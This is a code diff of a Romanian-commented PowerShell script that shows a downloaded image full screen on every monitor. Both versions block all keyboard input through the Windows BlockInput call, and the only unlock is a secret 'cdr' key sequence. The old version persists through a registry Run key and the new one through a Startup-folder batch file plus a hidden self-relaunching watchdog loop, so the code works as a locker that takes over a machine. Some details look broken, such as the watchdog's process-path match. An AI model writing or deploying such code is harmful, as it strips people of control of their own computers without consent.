@@ -12,41 +12,30 @@ function Download-Image {
     }
 }
 
-# Blochează tastatura
-function Block-Keyboard {
-    Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public static class KeyboardBlocker {
-    [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
-    public static extern short GetAsyncKeyState(int vKey);
-    [DllImport("user32.dll", SetLastError = true)]
-    public static extern bool BlockInput(bool fBlockIt);
-}
-"@
-    [KeyboardBlocker]::BlockInput($true)
-}
-
-# Ascultă pentru secvența "cdr"
-function ListenForUnlock {
-    $unlockSequence = "cdr"
-    $currentInput = ""
-
-    while ($true) {
-        Start-Sleep -Milliseconds 100
-        for ($i = 0; $i -lt 256; $i++) {
-            if ([KeyboardBlocker]::GetAsyncKeyState($i) -ne 0) {
-                $key = [char]$i
-                $currentInput += $key.ToLower()
-                if ($currentInput -like "*$unlockSequence") {
-                    Stop-All
-                }
-                if ($currentInput.Length -gt $unlockSequence.Length) {
-                    $currentInput = $currentInput.Substring(1)
-                }
-            }
-        }
+# Funcție pentru blocarea tastelor critice
+function Block-Keys {
+    Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class InterceptKeys {
+        [DllImport("user32.dll")]
+        public static extern int BlockInput(bool block);
     }
+"@
+    [InterceptKeys]::BlockInput($true)
+}
+
+# Funcție pentru deblocarea tastelor
+function Unblock-Keys {
+    Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class InterceptKeys {
+        [DllImport("user32.dll")]
+        public static extern int BlockInput(bool block);
+    }
+"@
+    [InterceptKeys]::BlockInput($false)
 }
 
 # Afișare imagine pe toate monitoarele
@@ -79,13 +68,18 @@ function Show-FullScreenImage {
         $pictureBox.SizeMode = 'StretchImage'
         $form.Controls.Add($pictureBox)
 
-        $form.Add_FormClosing({
-            param($sender, $eventArgs)
-            $eventArgs.Cancel = $true
-        })
-
         $forms += $form
     }
+
+    # Ascultare pentru introducerea codului secret
+    $global:keySequence = ""
+    $forms[0].Add_KeyDown({
+        param($sender, $eventArgs)
+        $global:keySequence += $eventArgs.KeyChar
+        if ($global:keySequence -like "*cdr") {
+            Stop-All
+        }
+    })
 
     foreach ($form in $forms) {
         [void]$form.Show()
@@ -96,24 +90,35 @@ function Show-FullScreenImage {
 
 # Funcție pentru oprirea completă a aplicației
 function Stop-All {
-    [KeyboardBlocker]::BlockInput($false)
+    $global:exitFlag = $true
+    Unblock-Keys
     Stop-Process -Name "powershell" -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PersistentImageViewer.bat" -Force -ErrorAction SilentlyContinue
     exit
 }
 
-# Configurează pornirea automată
-function Configure-Startup {
-    $scriptPath = $MyInvocation.MyCommand.Definition
-    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $scriptName = "PCSpecDisplay"
-    Set-ItemProperty -Path $regPath -Name $scriptName -Value "powershell -ExecutionPolicy Bypass -File `"$scriptPath`""
+# Configurare pornire automată
+function Set-Startup {
+    $scriptPath = $MyInvocation.MyCommand.Path
+    $batFilePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PersistentImageViewer.bat"
+    $batContent = "@echo off`nstart /min powershell.exe -ExecutionPolicy Bypass -File `"$scriptPath`""
+    Set-Content -Path $batFilePath -Value $batContent -Force
 }
 
-# Descărcare imagine și rulare
-Download-Image
-Configure-Startup
+# Monitorizare proces pentru repornire automată
+function Monitor-Image {
+    while ($true) {
+        $processes = Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*PersistentImage.ps1*" }
+        if (-not $processes) {
+            Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$MyInvocation.MyCommand.Path`"" -WindowStyle Hidden
+        }
+        Start-Sleep -Seconds 2
+    }
+}
 
-# Pornire aplicație
-Start-Job -ScriptBlock { ListenForUnlock }
-Block-Keyboard
+# Executare funcționalități
+Download-Image
+Set-Startup
+Block-Keys
+Start-Job -ScriptBlock { Monitor-Image }
 Show-FullScreenImage
